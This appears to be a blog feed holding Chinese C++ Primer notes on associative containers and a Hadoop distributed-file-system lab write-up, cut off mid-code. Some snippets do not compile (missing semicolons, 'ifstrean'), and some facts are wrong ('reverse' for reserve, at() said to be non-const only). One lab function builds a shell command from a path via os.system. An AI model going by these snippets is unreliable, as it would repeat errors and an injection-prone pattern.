id="关联容器迭代器">关联容器迭代器</h3><ul><li>解引用一个关联容器迭代器时，会得到一个类型为容器的<code>value_type</code>的值的引用。</li><li>一个<code>map</code>的value_type是一个pair，但我们可以改变pair值，却不能改变关键字成员的值（因为是const的）。</li><li><code>set</code>的迭代器是<code>const</code>的，是只读的。虽然set类型同时定义类iterator和const_iterator类型，但两种类型都只允许只读访问set中的元素。</li><li>遍历关联容器：使用<code>begin</code>和<code>end</code>，遍历<code>map</code>、<code>multimap</code>、<code>set</code>、<code>multiset</code>时，迭代器按<strong>关键字升序</strong>遍历元素。<br>通过迭代器访问元素时需要解引用，比如<code>map_it-&gt;first</code>。再次强调<code>map_it-&gt;first</code>和<code>*set_it</code> 都是const的。</li><li>通常不对关联容器使用泛型算法，如果我们真要对一个容器使用算法，要么是将其当作一个原序列，要么当做一个目的位置。比如<code>c</code>是一个<code>string</code>的<code>multiset</code>，<code>v</code> 是一个<code>string</code> 的<code>vector</code>，可以使用<code>copy(v.begin(), v.end(), inserter(c, c.end()));</code>。</li></ul><h3 id="添加元素">添加元素</h3><p><strong>关联容器<code>insert</code>操作</strong>：</p><p>由于map和set（以及对应的无序类型）包含不重复的关键字，因此插入一个已经存在的元素对容器不会有任何影响。但是会返回一个pair告诉我们插入失效。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>   map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mp;</span><br><span class="line"><span class="number">11</span>   mp.<span class="built_in">insert</span>(&#123;<span class="number">1</span>, <span class="number">1</span>&#125;);</span><br><span class="line"><span class="number">12</span>   mp.<span class="built_in">insert</span>(&#123;<span class="number">1</span>, <span class="number">2</span>&#125;);</span><br><span class="line"><span class="number">13</span>   <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, mp[<span class="number">1</span>]);  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><table><thead><tr><th><code>insert</code>操作</th><th>关联容器</th></tr></thead><tbody><tr><td><code>c.insert(v)</code>  <code>c.emplace(args)</code></td><td><code>v</code>是<code>value_type</code>类型的对象；<code>args</code>用来构造一个元素。 对于<code>map</code>和<code>set</code>，只有元素的关键字不存在<code>c</code>中才插入或构造元素。函数返回一个<code>pair</code>，包含一个迭代器，指向具有指定关键字的元素，以及一个指示插入是否成功的<code>bool</code>值。对于<code>multimap</code>和<code>multiset</code>则会插入范围中的每个元素。</td></tr><tr><td><code>c.insert(b, e)</code> <code>c.insert(il)</code></td><td><code>b</code>和<code>e</code>是迭代器，表示一个<code>c::value_type</code>类型值的范围；<code>il</code>是这种值的花括号列表。函数返回<code>void</code>。对于 <code>map</code>和<code>set</code>，只插入关键字不在<code>c</code>中的元素。</td></tr><tr><td><code>c.insert(p, v)</code>  <code>c.emplace(p, args)</code></td><td>类似<code>insert(v)</code>，但将迭代器<code>p</code>作为一个提示，指出<strong>从哪里开始搜索新元素应该存储的位置</strong>。返回一个迭代器，指向具有给定关键字的元素。</td></tr></tbody></table><p>向<code>map</code>添加元素：</p><ul><li><code>word_count.insert(&#123;word, 1&#125;);</code></li><li><code>word_count.insert(make_pair(word, 1));</code></li><li><code>word_count.insert(pair&lt;string, size_t&gt;(word, 1));</code></li><li><code>word_count.insert(map&lt;string, size_t&gt;::value_type (word, 1));</code></li></ul><h4 id="练习11-22">练习11.22</h4><p>Q: 给定一个<code>map&lt;string, vector&lt;int&gt;&gt;</code>，对此容器的插入一个元素的<code>insert</code>版本，写出其参数类型和返回类型。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::pair&lt;std::string, std::vector&lt;<span class="type">int</span>&gt;&gt;    <span class="comment">// 参数类型</span></span><br><span class="line">std::pair&lt;std::map&lt;std::string, std::vector&lt;<span class="type">int</span>&gt;&gt;::iterator, <span class="type">bool</span>&gt; <span class="comment">// 返回类型</span></span><br></pre></td></tr></table></figure><h3 id="删除元素">删除元素</h3><p><strong>从关联容器中删除元素</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.erase(k)</code></td><td>从<code>c</code>中删除每个关键字为<code>k</code>的元素。返回一个<code>size_type</code>值，指出删除的元素的数量。</td></tr><tr><td><code>c.erase(p)</code></td><td>从<code>c</code>中删除迭代器<code>p</code>指定的元素。<code>p</code>必须指向<code>c</code>中一个真实元素，不能等于<code>c.end()</code>。返回一个指向<code>p</code>之后元素的迭代器，若<code>p</code>指向<code>c</code>中的尾元素，则返回<code>c.end()</code></td></tr><tr><td><code>c.erase(b, e)</code></td><td>删除迭代器对<code>b</code>和<code>e</code>所表示范围中的元素。返回<code>e</code>。</td></tr></tbody></table><p>使用<code>c.erase(k)</code>删除不存在的k并不会报错：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash&#123;&#123;<span class="number">1</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line">    cout &lt;&lt; hash.<span class="built_in">erase</span>(<span class="number">1</span>) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; hash.<span class="built_in">erase</span>(<span class="number">2</span>) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="下标操作">下标操作</h3><p><strong><code>map</code>和<code>unordered_map</code>的下标操作</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c[k]</code></td><td>返回关键字为<code>k</code>的元素；<strong>如果<code>k</code>不在<code>c</code>中，添加一个关键字为<code>k</code>的元素，对其值初始化。</strong></td></tr><tr><td><code>c.at(k)</code></td><td>访问关键字为<code>k</code>的元素，带参数检查；<strong>若<code>k</code>不存在在<code>c</code>中，抛出一个<code>out_of_range</code>异常。</strong></td></tr></tbody></table><ul><li><strong>由于下标运算符可能插入一个新元素</strong>，所以只能对非const的map使用下标操作。</li><li>通常情况下，解引用一个迭代器所返回的类型和下标运算符返回的类型是一样的，但是对map进行下标操作时会获得一个mapped_type对象，而解引用一个map迭代器时会得到一个value_type对象（pair&lt;const key_type, mapped_type&gt;</li></ul><h3 id="查找元素">查找元素</h3><p><strong>在一个关联容器中查找元素</strong>:</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.find(k)</code></td><td>返回一个迭代器，指向第一个关键字为<code>k</code>的元素，若<code>k</code>不在容器中，则返回尾后迭代器</td></tr><tr><td><code>c.count(k)</code></td><td>返回关键字等于<code>k</code>的元素的数量。对于不允许重复关键字的容器，返回值永远是0或1。</td></tr><tr><td><code>c.lower_bound(k)</code></td><td>返回一个迭代器，指向第一个关键字<strong>不小于</strong><code>k</code>的元素。</td></tr><tr><td><code>c.upper_bound(k)</code></td><td>返回一个迭代器，指向第一个关键字<strong>大于</strong><code>k</code>的元素。</td></tr><tr><td><code>c.equal_range(k)</code></td><td>返回一个迭代器<code>pair</code>，表示关键字等于<code>k</code>的元素的范围。若<code>k</code>不存在，<code>pair</code>的两个成员均指向关键字可插入的位置。</td></tr></tbody></table><ul><li><p><code>lower_bound</code>和<code>upper_bound</code>不适用于无序容器。<br>二者并不报告关键字是否存在，重要的是它们的返回值可以作为一个迭代器范围。个人感觉使用<code>c.equal_range(k)</code>好。</p><ul><li>如果目标关键字存在，则lower_bound返回的迭代器指向第一个具有给定关键字的元素，而uppper_bound返回的迭代器指向最后一个匹配给定关键字之后的位置。</li><li>如果不存在，则二者返回相同的位置——指向一个不影响排序的关键字插入位置。</li></ul></li><li><p>下标和<code>at</code>操作只适用于非<code>const</code>的<code>map</code>和<code>unordered_map</code>。</p></li></ul><h4 id="练习11-30">练习<strong>11.30</strong></h4><p>Q: 对于本节最后一个程序中的输出表达式，解释运算对象<code>pos.first-&gt;second</code>的含义。</p><p><code>pos</code> 是一个<code>pair</code>，<code>pos.first</code> 是一个迭代器，指向匹配关键字的元素，该元素是一个 <code>pair</code>，访问该元素的第二个成员。</p><p>Q: 编写程序，定义一个作者及其作品的<code>multimap</code>。使用<code>find</code>在<code>multimap</code>中查找一个元素并用<code>erase</code>删除它。确保你的程序在元素不在<code>map</code> 中时也能正常运行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::multimap&lt;string, string&gt; authors&#123;</span><br><span class="line">&#123; <span class="string">&quot;alan&quot;</span>, <span class="string">&quot;DMA&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="string">&quot;pezy&quot;</span>, <span class="string">&quot;LeetCode&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="string">&quot;alan&quot;</span>, <span class="string">&quot;CLRS&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="string">&quot;wang&quot;</span>, <span class="string">&quot;FTP&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="string">&quot;pezy&quot;</span>, <span class="string">&quot;CP5&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="string">&quot;wang&quot;</span>, <span class="string">&quot;CPP-Concurrency&quot;</span> &#125; &#125;;</span><br><span class="line"></span><br><span class="line">string author = <span class="string">&quot;pezy&quot;</span>;</span><br><span class="line">string work = <span class="string">&quot;CP5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> found = authors.<span class="built_in">find</span>(author);</span><br><span class="line"><span class="keyword">auto</span> count = authors.<span class="built_in">count</span>(author);</span><br><span class="line"><span class="keyword">while</span> (count)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (found-&gt;second == work)</span><br><span class="line">&#123;</span><br><span class="line">authors.<span class="built_in">erase</span>(found);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">++found;  <span class="comment">// multimap中key按序排列</span></span><br><span class="line">--count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;author : authors)</span><br><span class="line">std::cout &lt;&lt; author.first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; author.second &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一个单词转换的map">一个单词转换的map</h3><h4 id="练习11-33">练习11.33</h4><p>Q: 实现你自己版本的单词转换程序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::string; <span class="keyword">using</span> std::ifstream;</span><br><span class="line"></span><br><span class="line"><span class="function">std::map&lt;string, string&gt; <span class="title">buildMap</span><span class="params">(ifstream &amp;map_file)</span> </span>&#123;</span><br><span class="line">  std::map&lt;string, string&gt; trans_map;</span><br><span class="line">  std::string key, value;</span><br><span class="line">  <span class="comment">// 读取第一个单词存入key中，行中剩余内容存入value</span></span><br><span class="line">  <span class="keyword">while</span> (map_file &gt;&gt; key &amp;&amp; <span class="built_in">getline</span>(map_file, value))</span><br><span class="line">    <span class="keyword">if</span> (value.<span class="built_in">size</span>() &gt; <span class="number">1</span>) </span><br><span class="line">      trans_map[key] = value.<span class="built_in">substr</span>(<span class="number">1</span>);  <span class="comment">// 跳过前导空格</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">throw</span> <span class="built_in">runtime_error</span>(<span class="string">&quot;no rule for &quot;</span> + key)</span><br><span class="line">  <span class="keyword">return</span> trans_map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">const</span> string &amp; <span class="title">transform</span><span class="params">(<span class="type">const</span> string &amp;s, <span class="type">const</span> std::map&lt;string, string&gt; &amp;m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> map_it = m.<span class="built_in">find</span>(s);  <span class="comment">// 使用find而非下标运算符以避免产生新元素</span></span><br><span class="line">    <span class="keyword">return</span> map_it == m.<span class="built_in">cend</span>() ? s : map_it-&gt;second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">word_transform</span><span class="params">(ifstream &amp;map, ifstream &amp;input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> trans_map = <span class="built_in">buildMap</span>(map);</span><br><span class="line">  <span class="function">std::string text</span></span><br><span class="line"><span class="function">  <span class="title">while</span> <span class="params">(getline(input, text))</span> </span>&#123;</span><br><span class="line">    <span class="function">std::istringstream <span class="title">iss</span><span class="params">(text)</span></span>;  <span class="comment">// 读取每个单词</span></span><br><span class="line">    <span class="function">std::string word</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="params">(iss &gt;&gt; word)</span></span></span><br><span class="line"><span class="function">        std::cout &lt;&lt; <span class="title">transform</span><span class="params">(word, trans_map)</span> &lt;&lt; &quot; &quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">ifstream <span class="title">ifs_map</span><span class="params">(<span class="string">&quot;../data/word_transformation_bad.txt&quot;</span>)</span></span>;</span><br><span class="line">  <span class="function">ifstrean <span class="title">ifs_content</span><span class="params">(<span class="string">&quot;../data/given_to_transform.txt&quot;</span>)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (ifs_map &amp;&amp; ifs_content) <span class="built_in">word_transform</span>(ifs_map, ifs_content);</span><br><span class="line">  <span class="keyword">else</span> std::cerr &lt;&lt; <span class="string">&quot;can&#x27;t find the documents.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意 getline 不会跳过前导空格，也不会跳过行首换行符（会导致第二参数为空字符串），它会一直读到下一个换行符，会“吃了”这个换行符，但返回第二个参数中并不会包含此换行符。</p><h4 id="练习11-35">练习11.35</h4><p>Q:在<code>buildMap</code>中，如果进行如下改写，会有什么效果？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">trans_map[key] = value.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//改为</span></span><br><span class="line">trans_map.<span class="built_in">insert</span>(&#123;key, value.<span class="built_in">substr</span>(<span class="number">1</span>)&#125;);</span><br></pre></td></tr></table></figure><p>A: 当一个转换规则的关键字多次出现的时候，<strong>使用下标运算符会保留最后一次添加的规则，而用insert则保留第一次添加的规则。</strong></p><h2 id="无序容器">无序容器</h2><ul><li>有序容器使用比较运算符来组织元素；无序容器<strong>使用哈希函数和关键字类型的<code>==</code>运算符</strong>。</li><li>理论上哈希技术可以获得更好的性能。</li><li>无序容器在存储上组织为一组桶(bucket)，每个桶保存零个或多个元素。无序容器使用一个哈希函数将元素映射到桶。</li><li>无论在有序容器中还是在无序容器中，具有相同关键字的元素都是相邻存储的。</li></ul><p><strong>无序容器管理操作</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><strong>桶接口</strong></td><td></td></tr><tr><td><code>c.bucket_count()</code></td><td>正在使用的桶的数目</td></tr><tr><td><code>c.max_bucket_count()</code></td><td>容器能容纳的最多的桶的数目</td></tr><tr><td><code>c.bucket_size(n)</code></td><td>第<code>n</code>个桶中有多少个元素</td></tr><tr><td><code>c.bucket(k)</code></td><td>关键字为<code>k</code>的元素在哪个桶中</td></tr><tr><td><strong>桶迭代</strong></td><td></td></tr><tr><td><code>local_iterator</code></td><td>可以用来访问桶中元素的迭代器类型</td></tr><tr><td><code>const_local_iterator</code></td><td>桶迭代器的<code>const</code>版本</td></tr><tr><td><code>c.begin(n)</code>，<code>c.end(n)</code></td><td>桶<code>n</code>的首元素迭代器</td></tr><tr><td><code>c.cbegin(n)</code>，<code>c.cend(n)</code></td><td>与前两个函数类似，但返回<code>const_local_iterator</code>。</td></tr><tr><td><strong>哈希策略</strong></td><td></td></tr><tr><td><code>c.load_factor()</code></td><td>每个桶的平均元素数量，返回<code>float</code>值。</td></tr><tr><td><code>c.max_load_factor()</code></td><td><code>c</code>试图维护的平均比桶大小，返回<code>float</code>值。<code>c</code>会在需要时添加新的桶，以使得<code>load_factor&lt;=max_load_factor</code></td></tr><tr><td><code>c.rehash(n)</code></td><td>重组存储，使得<code>bucket_count&gt;=n</code>，且<code>bucket_count&gt;size/max_load_factor</code></td></tr><tr><td><code>c.reverse(n)</code></td><td>重组存储，使得<code>c</code>可以保存<code>n</code>个元素且不必<code>rehash</code>。</td></tr></tbody></table><ul><li>标准库为内置类型（包括指针）提供了hash模版，还为一些标准库类型，包括string和智能指针类型定义了hash。</li><li>不能直接定义关键字类型为自定义类型的无序容器。与容器不同，不能直接使用hash模版，而必须提供自己的hash模版版本（P626）</li><li>不使用默认hash，但可以使用另一种方法，类似于为有序容器重载关键字类型的默认比较操作。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>lab2 分布式文件系统</title>
      <link href="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/"/>
      <url>/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/</url>
      
        <content type="html"><![CDATA[<h1 id="掌握Hadoop-DFS常用指令">掌握Hadoop DFS常用指令</h1><h2 id="1-Hadoop-使用方法">1. Hadoop 使用方法</h2><p>在服务器上，我们通过Linux 指令对本地文件系统进行操作，如使用 ls 查看文件/目录信息、使用 cp进行文件复制、使用 cat 查看文件内容。在分布式文件系统中，也有一套相似的指令，接下来我们需要掌握一些基本的指令。（本题 1 分）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~$ hadoop fs -<span class="built_in">ls</span> /</span><br><span class="line">Found 2 items</span><br><span class="line">drwxr-xr-x   - root  supergroup          0 2023-10-06 20:48 /dsjxtjc</span><br><span class="line">drwxrwxrwx   - jtliu supergroup          0 2020-12-21 23:25 /tmp</span><br><span class="line">xxxxxxxxxx@thumm01:~$ hadoop fs -<span class="built_in">ls</span> /dsjxtjc/xxxxxxxxxx</span><br><span class="line">xxxxxxxxxx@thumm01:~$ <span class="built_in">touch</span> test.txt</span><br><span class="line">xxxxxxxxxx@thumm01:~$ <span class="built_in">echo</span> <span class="string">&quot;Hello Hadoop&quot;</span> &gt; test.txt</span><br><span class="line">xxxxxxxxxx@thumm01:~$ <span class="built_in">cat</span> test.txt</span><br><span class="line">Hello Hadoop</span><br><span class="line">xxxxxxxxxx@thumm01:~$ hadoop fs -copyFromLocal ./test.txt /dsjxtjc/xxxxxxxxxx/</span><br><span class="line">2023-10-31 20:31:31,606 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = <span class="literal">false</span>, remoteHostTrusted = <span class="literal">false</span></span><br><span class="line">xxxxxxxxxx@thumm01:~$ hadoop fs -<span class="built_in">cat</span> /dsjxtjc/xxxxxxxxxx/test.txt</span><br><span class="line">2023-10-31 20:32:01,519 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = <span class="literal">false</span>, remoteHostTrusted = <span class="literal">false</span></span><br><span class="line">Hello Hadoop</span><br></pre></td></tr></table></figure><h2 id="2-通过Web查看Hadoop运行情况">2. 通过Web查看Hadoop运行情况</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">版权所有（C） Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">安装最新的 PowerShell，了解新功能和改进！https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\jkup&gt; ssh xxxxxxxxxx@<span class="number">10.103</span>.<span class="number">9.11</span> <span class="literal">-L</span> <span class="number">9870</span>:<span class="number">192.169</span>.<span class="number">0.101</span>:<span class="number">9870</span></span><br><span class="line">Welcome to Ubuntu <span class="number">16.04</span>.<span class="number">7</span> LTS (GNU/Linux <span class="number">4.4</span>.<span class="number">0</span><span class="literal">-210-generic</span> x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">UA Infra: Extended Security Maintenance (ESM) is not enabled.</span><br><span class="line"></span><br><span class="line"><span class="number">0</span> updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"><span class="number">307</span> additional security updates can be applied with UA Infra: ESM</span><br><span class="line">Learn more about enabling UA Infra: ESM service <span class="keyword">for</span> Ubuntu <span class="number">16.04</span> at</span><br><span class="line">https://ubuntu.com/<span class="number">16</span><span class="literal">-04</span></span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">New release <span class="string">&#x27;18.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Oct <span class="number">31</span> <span class="number">19</span>:<span class="number">57</span>:<span class="number">30</span> <span class="number">2023</span> from <span class="number">10.81</span>.<span class="number">32.116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xxxxxxxxxx@thumm01:~<span class="variable">$</span></span><br></pre></td></tr></table></figure><p><img src="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/image-20231031204053330.png" alt></p><h1 id="分布式文件系统">分布式文件系统</h1><h2 id="copyFromLocal">copyFromLocal</h2><p><code>copyFromLocal</code> 的功能是将本地文件传到DFS之中。具体来说， client 会把文件信息通过<code>new_fat_item</code> 指令给NameNode，NameNode根据文件大小分配空间，并将相应空间信息以FAT表的形式返回给 <a href="http://client.py">client.py</a> （详见 name_node.py 中的 new_fat_item 函数）；接着，Client 根据FAT表和目标节点逐个建立连接发送数据块。</p><h3 id="name-node-py">name_node.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">new_fat_item</span>(<span class="params">self, dfs_path, file_size</span>):</span><br><span class="line">    nb_blks = <span class="built_in">int</span>(math.ceil(file_size / DFS_BLK_SIZE))</span><br><span class="line">    <span class="built_in">print</span>(file_size, nb_blks)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果dfs_replication为复数时可以新增host_name的数目</span></span><br><span class="line">    data_pd = pd.DataFrame(columns=[<span class="string">&#x27;blk_no&#x27;</span>, <span class="string">&#x27;host_name&#x27;</span>, <span class="string">&#x27;blk_size&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nb_blks):</span><br><span class="line">        blk_no = i</span><br><span class="line">        host_name = np.random.choice(HOST_LIST, size=DFS_REPLICATION, replace=<span class="literal">False</span>)</span><br><span class="line">        blk_size = <span class="built_in">min</span>(DFS_BLK_SIZE, file_size - i * DFS_BLK_SIZE)</span><br><span class="line">        data_pd.loc[i] = [blk_no, host_name, blk_size]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取本地路径</span></span><br><span class="line">    local_path = os.path.join(NAME_NODE_DIR, dfs_path)</span><br><span class="line">    <span class="comment"># 若目录不存在则创建新目录</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir -p &#123;&#125;&quot;</span>.<span class="built_in">format</span>(os.path.dirname(local_path)))</span><br><span class="line">    <span class="comment"># 保存FAT表为CSV文件</span></span><br><span class="line">    data_pd.to_csv(local_path, index=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 同时返回CSV内容到请求节点</span></span><br><span class="line">    <span class="keyword">return</span> data_pd.to_csv(index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="data-node-py">data_node.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span 